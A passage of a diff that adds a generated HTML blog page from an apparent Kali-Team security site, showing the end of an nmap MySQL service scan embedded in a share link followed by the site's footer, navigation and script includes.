SupportsLoadDataLocal, FoundRows, SupportsCompression, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongPassword, IgnoreSigpipes, ODBCClient&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   Status: Autocommit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|_  Salt: &#34;]0w&#39;Xi((0XLS:j&#39;&#34;r&amp;lt;q&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Kali-Team
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/$projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
